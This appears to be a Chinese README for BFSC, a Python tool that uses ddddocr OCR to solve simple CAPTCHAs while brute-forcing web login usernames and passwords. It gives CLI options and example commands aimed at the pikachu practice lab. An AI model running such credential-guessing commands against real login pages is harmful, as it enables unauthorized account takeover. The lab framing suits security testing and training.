# BFSC 简单验证码爆破工具

brute-force attack with simple CAPTCHA
利用ddddocr离线orc工具，实现简单验证码的识别，从而对web页面进行用户名和密码爆破

## 环境准备

- python3.x环境
- 安装依赖包：

```bash
pip install requests, ddddocr
```

## 使用方法

使用工具爆破验证码需要知道login页面的url和获取验证码的url。

验证证码的url可以通过浏览器的开发者模式获取。在登录页面按f12进入开发者模式，点击network抓包，点击验证码图片刷新，可以找到验证码的url。
其他的可选参数也可以通过network抓包或BurpSuite抓包来获取。
使用如下命令进行爆破：

```
python bfsc.py [-h] [-d] [-u] [-p] [--header] [--hash_type] [--error_code] [--proxy] login_url code_url
```

其中 login_url 是登录页面的url，code_url 是获取验证码的url，是必选参数。

使用帮助如下：
```bash
验证码爆破工具

positional arguments:
  login_url             login URL
  code_url              vcode URL

options:
  -h, --help            show this help message and exit
  -d, --post_data       post_params, like 'username=admin&password=123456&vcode=1234&submit=submit'
  -u, --user_file       username dict file
  -p, --pass_file       password dict file
  --header              Custom request headers, Key:Value
  --hash_type           password encrypt type, support:md5,sha1,sha512
  --error_msg           code error message
  --proxy               HTTP proxy, like http://127.0.0.1:8080
```

其中：
hash_type 用于指定密码加密方式，支持 md5, sha1, sha512 三种方式，默认不加密。
error_code 选项用于指定验证码错误后的页面返回的提示，可以提高验证码识别成功率。
原因是ddddocr识别验证码的准确率并非100%，使用error_code参数可以让工具检测到登录错误原因是验证码识别错误，通过多次识别的方式，避免因验证码错误而错过关键密码。

## 示例

以pikachu靶场的验证码爆破为例

- 指定post表单

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php -d "username=admin&password=123456&vcode=jydqor&submit=Login"
```

- 自定义字典文件, 也可以修改dict文件夹中的默认字典

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php -d "username=admin&password=123456&vcode=jydqor&submit=Login" -u username_dict_path -p password_dict_path
```

- 指定http header

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php -d "username=admin&password=123456&vcode=jydqor&submit=Login" --header 'User-Agent: Curl' --header 'Accept-Language: zh-CN' 
```

- 密码为hash加密传输 支持 md5、sha1、sha512

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php  -d "username=admin&password=123456&vcode=jydqor&submit=Login"  --hash_type md5 
```

- 指定验证码错误信息

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php -d "username=admin&password=123456&vcode=jydqor&submit=Login"  --error_code 验证码输入错误
```

- 添加http代理

```bash
python bfsc.py http://pikachu.shifa23.com/vul/burteforce/bf_server.php http://pikachu.shifa23.com/inc/showvcode.php  -d "username=admin&password=123456&vcode=jydqor&submit=Login"  --proxy http://127.0.0.1:8080
```

爆破过程会打印在控制台窗口，并在脚本目录生成log日志。